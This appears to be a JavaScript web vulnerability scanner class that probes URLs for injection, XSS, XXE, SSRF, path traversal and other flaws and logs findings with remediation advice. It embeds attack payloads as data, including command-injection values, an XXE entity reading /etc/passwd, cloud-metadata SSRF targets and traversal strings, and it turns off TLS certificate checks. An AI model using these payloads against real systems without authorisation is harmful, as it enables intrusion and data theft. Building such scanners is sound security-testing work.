const EventEmitter = require('events');
const axios = require('axios');
const https = require('https');

class VulnerabilityScanner extends EventEmitter {
  constructor(config, database) {
    super();
    this.config = config;
    this.db = database;
    this.isRunning = false;
    this.httpsAgent = new https.Agent({
      rejectUnauthorized: false
    });
  }

  async scan(urls, policy) {
    if (this.isRunning) {
      throw new Error('Scanner is already running');
    }

    this.isRunning = true;
    this.emit('started');

    for (const url of urls) {
      if (!this.isRunning) break;

      try {
        await this.scanUrl(url, policy);
      } catch (error) {
        console.error(`Error scanning ${url}:`, error.message);
      }

      this.emit('progress', {
        current: urls.indexOf(url) + 1,
        total: urls.length
      });
    }

    this.isRunning = false;
    this.emit('completed');
  }

  async scanUrl(url, policy) {
    const checks = policy.vulnerabilityChecks;

    // Active scanning
    if (this.config.activeScanning) {
      if (checks.sqlInjection) await this.checkSQLInjection(url);
      if (checks.xssReflected) await this.checkXSSReflected(url);
      if (checks.commandInjection) await this.checkCommandInjection(url);
      if (checks.xxe) await this.checkXXE(url);
      if (checks.ssrf) await this.checkSSRF(url);
      if (checks.pathTraversal) await this.checkPathTraversal(url);
      if (checks.openRedirect) await this.checkOpenRedirect(url);
      if (checks.ldapInjection) await this.checkLDAPInjection(url);
      if (checks.xmlInjection) await this.checkXMLInjection(url);
      if (checks.headerInjection) await this.checkHeaderInjection(url);
    }

    // Passive scanning
    if (this.config.passiveScanning) {
      const response = await this.fetchUrl(url);
      if (response) {
        if (checks.insecureCookie) this.checkInsecureCookies(url, response);
        if (checks.clickjacking) this.checkClickjacking(url, response);
        if (checks.securityMisconfiguration) this.checkSecurityHeaders(url, response);
        if (checks.informationDisclosure) this.checkInformationDisclosure(url, response);
        if (checks.csrf) this.checkCSRF(url, response);
      }
    }
  }

  async fetchUrl(url, options = {}) {
    try {
      const response = await axios({
        method: options.method || 'GET',
        url,
        data: options.data,
        headers: options.headers || {},
        maxRedirects: 0,
        validateStatus: () => true,
        httpsAgent: this.httpsAgent,
        timeout: 10000
      });

      return response;
    } catch (error) {
      console.error(`Error fetching ${url}:`, error.message);
      return null;
    }
  }

  // SQL Injection Scanner
  async checkSQLInjection(url) {
    const payloads = [
      "' OR '1'='1",
      "1' OR '1'='1' --",
      "' UNION SELECT NULL--",
      "1' AND 1=0 UNION ALL SELECT 'admin', 'password'--",
      "admin'--",
      "' OR 1=1--",
      "1' ORDER BY 1--",
      "1' ORDER BY 100--", // Error-based
      "' AND SLEEP(5)--", // Time-based
      "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    ];

    const sqlErrors = [
      'SQL syntax',
      'mysql_fetch',
      'ORA-',
      'PostgreSQL',
      'ODBC SQL',
      'SQLite',
      'Unclosed quotation mark',
      'quoted string not properly terminated'
    ];

    for (const payload of payloads) {
      try {
        const testUrl = this.injectParameter(url, payload);
        const startTime = Date.now();
        const response = await this.fetchUrl(testUrl);
        const responseTime = Date.now() - startTime;

        if (!response) continue;

        // Check for SQL errors
        const bodyString = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        const hasError = sqlErrors.some(err => bodyString.includes(err));

        // Check for time-based injection (response time > 4 seconds)
        const isTimeBased = payload.includes('SLEEP') && responseTime > 4000;

        if (hasError || isTimeBased) {
          this.reportVulnerability({
            url,
            vulnerabilityType: 'SQL Injection',
            severity: 'critical',
            confidence: hasError ? 'firm' : 'tentative',
            cvssScore: 9.8,
            cweId: 'CWE-89',
            owaspCategory: 'A03:2021 - Injection',
            description: `SQL Injection vulnerability detected using payload: ${payload}`,
            proofOfConcept: {
              payload,
              request: testUrl,
              response: bodyString.substring(0, 500),
              detectionMethod: hasError ? 'error-based' : 'time-based'
            },
            remediation: 'Use parameterized queries or prepared statements. Never concatenate user input directly into SQL queries.',
            scanType: 'active'
          });

          break; // Found vulnerability, no need to test more payloads
        }
      } catch (error) {
        // Error might indicate injection
        if (error.message.includes('timeout')) {
          // Potential time-based SQL injection
        }
      }
    }
  }

  // XSS Scanner (Reflected)
  async checkXSSReflected(url) {
    const payloads = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '\'"--><script>alert(1)</script>',
      '<scr<script>ipt>alert(1)</scr</script>ipt>'
    ];

    for (const payload of payloads) {
      const testUrl = this.injectParameter(url, payload);
      const response = await this.fetchUrl(testUrl);

      if (!response) continue;

      const bodyString = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

      // Check if payload is reflected without proper encoding
      if (bodyString.includes(payload) || bodyString.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'))) {
        // Check if it's actually executable (not in comments, not encoded)
        const isExecutable = bodyString.includes('<script>') || bodyString.includes('onerror=') || bodyString.includes('onload=');

        if (isExecutable) {
          this.reportVulnerability({
            url,
            vulnerabilityType: 'Cross-Site Scripting (XSS) - Reflected',
            severity: 'high',
            confidence: 'firm',
            cvssScore: 7.2,
            cweId: 'CWE-79',
            owaspCategory: 'A03:2021 - Injection',
            description: 'Reflected XSS vulnerability detected. User input is reflected in the response without proper sanitization.',
            proofOfConcept: {
              payload,
              request: testUrl,
              response: bodyString.substring(0, 500),
              reflection: bodyString.substring(bodyString.indexOf(payload), bodyString.indexOf(payload) + 100)
            },
            remediation: 'Implement proper output encoding (HTML entity encoding, JavaScript encoding, etc.). Use Content-Security-Policy headers.',
            scanType: 'active'
          });

          break;
        }
      }
    }
  }

  // Command Injection Scanner
  async checkCommandInjection(url) {
    const payloads = [
      '; ls -la',
      '| whoami',
      '`ping -c 5 127.0.0.1`',
      '& ping -c 5 127.0.0.1 &',
      '; sleep 5',
      '| sleep 5',
      '$(sleep 5)',
      '`sleep 5`'
    ];

    const commandOutputs = ['root', 'bin', 'usr', 'total', 'drwx', 'UID', 'PID'];

    for (const payload of payloads) {
      const testUrl = this.injectParameter(url, payload);
      const startTime = Date.now();
      const response = await this.fetchUrl(testUrl);
      const responseTime = Date.now() - startTime;

      if (!response) continue;

      const bodyString = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

      // Check for command output
      const hasCommandOutput = commandOutputs.some(output => bodyString.includes(output));

      // Check for time-based detection
      const isTimeBased = payload.includes('sleep') && responseTime > 4000;

      if (hasCommandOutput || isTimeBased) {
        this.reportVulnerability({
          url,
          vulnerabilityType: 'Command Injection',
          severity: 'critical',
          confidence: hasCommandOutput ? 'firm' : 'tentative',
          cvssScore: 9.8,
          cweId: 'CWE-78',
          owaspCategory: 'A03:2021 - Injection',
          description: 'Command Injection vulnerability detected. System commands can be executed.',
          proofOfConcept: {
            payload,
            request: testUrl,
            response: bodyString.substring(0, 500),
            detectionMethod: hasCommandOutput ? 'output-based' : 'time-based'
          },
          remediation: 'Avoid executing system commands with user input. Use allowlists for input validation. Consider using safe APIs instead of shell commands.',
          scanType: 'active'
        });

        break;
      }
    }
  }

  // XXE Scanner
  async checkXXE(url) {
    const xxePayload = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`;

    const response = await this.fetchUrl(url, {
      method: 'POST',
      data: xxePayload,
      headers: {
        'Content-Type': 'application/xml'
      }
    });

    if (!response) return;

    const bodyString = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

    // Check for /etc/passwd content
    if (bodyString.includes('root:x:0:0') || bodyString.includes('/bin/bash') || bodyString.includes('/sbin/nologin')) {
      this.reportVulnerability({
        url,
        vulnerabilityType: 'XML External Entity (XXE) Injection',
        severity: 'high',
        confidence: 'certain',
        cvssScore: 8.6,
        cweId: 'CWE-611',
        owaspCategory: 'A05:2021 - Security Misconfiguration',
        description: 'XXE vulnerability detected. XML parser processes external entities, allowing file disclosure.',
        proofOfConcept: {
          payload: xxePayload,
          request: url,
          response: bodyString.substring(0, 500)
        },
        remediation: 'Disable external entity processing in XML parsers. Use secure XML parser configurations.',
        scanType: 'active'
      });
    }
  }

  // SSRF Scanner
  async checkSSRF(url) {
    const ssrfTargets = [
      'http://169.254.169.254/latest/meta-data/', // AWS metadata
      'http://metadata.google.internal/computeMetadata/v1/', // GCP metadata
      'http://127.0.0.1:80',
      'http://localhost:22',
      'http://0.0.0.0:80'
    ];

    for (const target of ssrfTargets) {
      const testUrl = this.injectParameter(url, target);
      const response = await this.fetchUrl(testUrl);

      if (!response) continue;

      const bodyString = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

      // Check for cloud metadata
      if (bodyString.includes('ami-id') || bodyString.includes('instance-id') || bodyString.includes('credentials')) {
        this.reportVulnerability({
          url,
          vulnerabilityType: 'Server-Side Request Forgery (SSRF)',
          severity: 'critical',
          confidence: 'firm',
          cvssScore: 9.1,
          cweId: 'CWE-918',
          owaspCategory: 'A10:2021 - Server-Side Request Forgery',
          description: 'SSRF vulnerability detected. Server can be tricked into making requests to internal resources.',
          proofOfConcept: {
            payload: target,
            request: testUrl,
            response: bodyString.substring(0, 500),
            target: 'Cloud metadata endpoint'
          },
          remediation: 'Implement allowlist for URLs. Validate and sanitize all user-supplied URLs. Disable unnecessary URL schemas.',
          scanType: 'active'
        });

        break;
      }
    }
  }

  // Path Traversal Scanner
  async checkPathTraversal(url) {
    const payloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\win.ini',
      '....//....//....//etc/passwd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '..%5c..%5c..%5cwindows%5cwin.ini'
    ];

    for (const payload of payloads) {
      const testUrl = this.injectParameter(url, payload);
      const response = await this.fetchUrl(testUrl);

      if (!response) continue;

      const bodyString = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

      // Check for file content indicators
      if (bodyString.includes('root:x:0:0') || bodyString.includes('[extensions]') || bodyString.includes('; for 16-bit app support')) {
        this.reportVulnerability({
          url,
          vulnerabilityType: 'Path Traversal / Directory Traversal',
          severity: 'high',
          confidence: 'certain',
          cvssScore: 7.5,
          cweId: 'CWE-22',
          owaspCategory: 'A01:2021 - Broken Access Control',
          description: 'Path Traversal vulnerability detected. Arbitrary files can be read from the server.',
          proofOfConcept: {
            payload,
            request: testUrl,
            response: bodyString.substring(0, 500)
          },
          remediation: 'Use allowlist for file paths. Validate and sanitize file paths. Use safe file access APIs.',
          scanType: 'active'
        });

        break;
      }
    }
  }

  // Open Redirect Scanner
  async checkOpenRedirect(url) {
    const redirectTargets = [
      'https://evil.com',
      '//evil.com',
      'javascript:alert(1)'
    ];

    for (const target of redirectTargets) {
      const testUrl = this.injectParameter(url, target);
      const response = await this.fetchUrl(testUrl);

      if (!response) continue;

      // Check for redirect
      if (response.status >= 300 && response.status < 400) {
        const location = response.headers.location || '';
        if (location.includes('evil.com') || location.includes(target)) {
          this.reportVulnerability({
            url,
            vulnerabilityType: 'Open Redirect',
            severity: 'medium',
            confidence: 'firm',
            cvssScore: 6.1,
            cweId: 'CWE-601',
            owaspCategory: 'A01:2021 - Broken Access Control',
            description: 'Open Redirect vulnerability detected. Users can be redirected to arbitrary URLs.',
            proofOfConcept: {
              payload: target,
              request: testUrl,
              redirectLocation: location
            },
            remediation: 'Validate redirect URLs against an allowlist. Avoid using user input directly in redirect locations.',
            scanType: 'active'
          });

          break;
        }
      }
    }
  }

  // LDAP Injection Scanner
  async checkLDAPInjection(url) {
    const payloads = [
      '*',
      '*)(&',
      '*)(|',
      'admin*',
      '*)(uid=*'
    ];

    for (const payload of payloads) {
      const testUrl = this.injectParameter(url, payload);
      const response = await this.fetchUrl(testUrl);

      if (!response) continue;

      const bodyString = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

      // Check for LDAP errors or unexpected results
      if (bodyString.includes('LDAP') || bodyString.includes('distinguished name') || response.status === 500) {
        this.reportVulnerability({
          url,
          vulnerabilityType: 'LDAP Injection',
          severity: 'high',
          confidence: 'tentative',
          cvssScore: 7.3,
          cweId: 'CWE-90',
          owaspCategory: 'A03:2021 - Injection',
          description: 'Potential LDAP Injection vulnerability detected.',
          proofOfConcept: {
            payload,
            request: testUrl,
            response: bodyString.substring(0, 500)
          },
          remediation: 'Use parameterized LDAP queries. Sanitize and validate user input before using in LDAP queries.',
          scanType: 'active'
        });

        break;
      }
    }
  }

  // XML Injection Scanner
  async checkXMLInjection(url) {
    const payload = `<![CDATA[<script>alert(1)</script>]]>`;

    const response = await this.fetchUrl(url, {
      method: 'POST',
      data: payload,
      headers: {
        'Content-Type': 'application/xml'
      }
    });

    if (!response) return;

    const bodyString = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

    if (bodyString.includes('<script>alert(1)</script>')) {
      this.reportVulnerability({
        url,
        vulnerabilityType: 'XML Injection',
        severity: 'medium',
        confidence: 'firm',
        cvssScore: 5.3,
        cweId: 'CWE-91',
        owaspCategory: 'A03:2021 - Injection',
        description: 'XML Injection vulnerability detected.',
        proofOfConcept: {
          payload,
          request: url,
          response: bodyString.substring(0, 500)
        },
        remediation: 'Properly validate and sanitize XML input. Use XML schema validation.',
        scanType: 'active'
      });
    }
  }

  // Header Injection Scanner
  async checkHeaderInjection(url) {
    const payload = 'test\r\nX-Injected-Header: injected';
    const testUrl = this.injectParameter(url, payload);

    const response = await this.fetchUrl(testUrl);

    if (!response) return;

    // Check if injected header appears in response
    if (response.headers['x-injected-header'] === 'injected') {
      this.reportVulnerability({
        url,
        vulnerabilityType: 'HTTP Header Injection',
        severity: 'medium',
        confidence: 'certain',
        cvssScore: 6.5,
        cweId: 'CWE-113',
        owaspCategory: 'A03:2021 - Injection',
        description: 'HTTP Header Injection vulnerability detected.',
        proofOfConcept: {
          payload,
          request: testUrl,
          injectedHeader: response.headers['x-injected-header']
        },
        remediation: 'Sanitize user input before including in HTTP headers. Remove CRLF characters.',
        scanType: 'active'
      });
    }
  }

  // Passive Checks

  checkInsecureCookies(url, response) {
    const cookies = response.headers['set-cookie'] || [];
    const insecureCookies = [];

    cookies.forEach(cookie => {
      const hasSecure = cookie.toLowerCase().includes('secure');
      const hasHttpOnly = cookie.toLowerCase().includes('httponly');
      const hasSameSite = cookie.toLowerCase().includes('samesite');

      if (!hasSecure || !hasHttpOnly || !hasSameSite) {
        insecureCookies.push(cookie);
      }
    });

    if (insecureCookies.length > 0) {
      this.reportVulnerability({
        url,
        vulnerabilityType: 'Insecure Cookie Configuration',
        severity: 'medium',
        confidence: 'certain',
        cvssScore: 5.3,
        cweId: 'CWE-614',
        owaspCategory: 'A05:2021 - Security Misconfiguration',
        description: 'Cookies are set without proper security flags (Secure, HttpOnly, SameSite).',
        proofOfConcept: {
          insecureCookies
        },
        remediation: 'Set Secure, HttpOnly, and SameSite flags on all cookies.',
        scanType: 'passive'
      });
    }
  }

  checkClickjacking(url, response) {
    const headers = response.headers;
    const hasXFrameOptions = headers['x-frame-options'];
    const hasCSP = headers['content-security-policy'] || headers['content-security-policy-report-only'];
    const hasFrameAncestors = hasCSP && hasCSP.includes('frame-ancestors');

    if (!hasXFrameOptions && !hasFrameAncestors) {
      this.reportVulnerability({
        url,
        vulnerabilityType: 'Clickjacking',
        severity: 'medium',
        confidence: 'firm',
        cvssScore: 4.3,
        cweId: 'CWE-1021',
        owaspCategory: 'A05:2021 - Security Misconfiguration',
        description: 'Missing anti-clickjacking headers (X-Frame-Options or CSP frame-ancestors).',
        proofOfConcept: {
          headers: {
            'X-Frame-Options': headers['x-frame-options'] || 'missing',
            'Content-Security-Policy': hasCSP || 'missing'
          }
        },
        remediation: 'Set X-Frame-Options: DENY or SAMEORIGIN, or use CSP frame-ancestors directive.',
        scanType: 'passive'
      });
    }
  }

  checkSecurityHeaders(url, response) {
    const headers = response.headers;
    const missingHeaders = [];

    const securityHeaders = {
      'strict-transport-security': 'HSTS',
      'x-content-type-options': 'X-Content-Type-Options',
      'x-frame-options': 'X-Frame-Options',
      'x-xss-protection': 'X-XSS-Protection',
      'content-security-policy': 'CSP'
    };

    Object.entries(securityHeaders).forEach(([header, name]) => {
      if (!headers[header]) {
        missingHeaders.push(name);
      }
    });

    if (missingHeaders.length > 0) {
      this.reportVulnerability({
        url,
        vulnerabilityType: 'Missing Security Headers',
        severity: 'low',
        confidence: 'certain',
        cvssScore: 3.7,
        cweId: 'CWE-693',
        owaspCategory: 'A05:2021 - Security Misconfiguration',
        description: `Missing security headers: ${missingHeaders.join(', ')}`,
        proofOfConcept: {
          missingHeaders
        },
        remediation: 'Implement all recommended security headers.',
        scanType: 'passive'
      });
    }
  }

  checkInformationDisclosure(url, response) {
    const bodyString = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
    const headers = response.headers;

    const sensitivePatterns = [
      { pattern: /password\s*=\s*['"][^'"]+['"]/i, type: 'Password in source' },
      { pattern: /api[_-]?key\s*=\s*['"][^'"]+['"]/i, type: 'API key in source' },
      { pattern: /secret\s*=\s*['"][^'"]+['"]/i, type: 'Secret in source' },
      { pattern: /private[_-]?key/i, type: 'Private key reference' },
      { pattern: /aws_access_key_id/i, type: 'AWS credentials' }
    ];

    const disclosures = [];

    sensitivePatterns.forEach(({ pattern, type }) => {
      if (pattern.test(bodyString)) {
        disclosures.push(type);
      }
    });

    // Check for verbose errors
    if (bodyString.includes('stack trace') || bodyString.includes('Exception') || bodyString.includes('SQL syntax')) {
      disclosures.push('Verbose error messages');
    }

    // Check server header
    if (headers['server'] && headers['server'].match(/\d+\.\d+/)) {
      disclosures.push('Server version disclosure');
    }

    if (disclosures.length > 0) {
      this.reportVulnerability({
        url,
        vulnerabilityType: 'Information Disclosure',
        severity: 'low',
        confidence: 'firm',
        cvssScore: 5.3,
        cweId: 'CWE-200',
        owaspCategory: 'A01:2021 - Broken Access Control',
        description: `Information disclosure detected: ${disclosures.join(', ')}`,
        proofOfConcept: {
          disclosures,
          serverHeader: headers['server']
        },
        remediation: 'Remove sensitive information from responses. Disable verbose error messages in production.',
        scanType: 'passive'
      });
    }
  }

  checkCSRF(url, response) {
    const bodyString = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

    // Check if there are forms without CSRF tokens
    const formRegex = /<form[^>]*>/gi;
    const forms = bodyString.match(formRegex) || [];

    const vulnerableForms = forms.filter(form => {
      // Check for POST method
      const isPost = /method\s*=\s*['"]post['"]/i.test(form);
      // Check for CSRF token
      const hasToken = bodyString.includes('csrf') || bodyString.includes('_token') || bodyString.includes('authenticity_token');

      return isPost && !hasToken;
    });

    if (vulnerableForms.length > 0) {
      this.reportVulnerability({
        url,
        vulnerabilityType: 'Cross-Site Request Forgery (CSRF)',
        severity: 'medium',
        confidence: 'tentative',
        cvssScore: 6.5,
        cweId: 'CWE-352',
        owaspCategory: 'A01:2021 - Broken Access Control',
        description: 'Forms detected without apparent CSRF protection.',
        proofOfConcept: {
          vulnerableFormsCount: vulnerableForms.length
        },
        remediation: 'Implement CSRF tokens for all state-changing operations. Use SameSite cookie attribute.',
        scanType: 'passive'
      });
    }
  }

  // Helper methods

  injectParameter(url, payload) {
    try {
      const urlObj = new URL(url);

      // If URL has query parameters, inject into first parameter
      if (urlObj.searchParams.toString()) {
        const firstParam = Array.from(urlObj.searchParams.keys())[0];
        urlObj.searchParams.set(firstParam, payload);
      } else {
        // Add a test parameter
        urlObj.searchParams.set('test', payload);
      }

      return urlObj.toString();
    } catch (e) {
      return url;
    }
  }

  reportVulnerability(vuln) {
    const vulnerability = {
      id: Date.now().toString() + Math.random(),
      ...vuln,
      discoveredAt: Date.now()
    };

    this.db.addVulnerability(vulnerability);
    this.emit('vulnerability-found', vulnerability);
  }

  stop() {
    this.isRunning = false;
    this.emit('stopped');
  }
}

module.exports = VulnerabilityScanner;
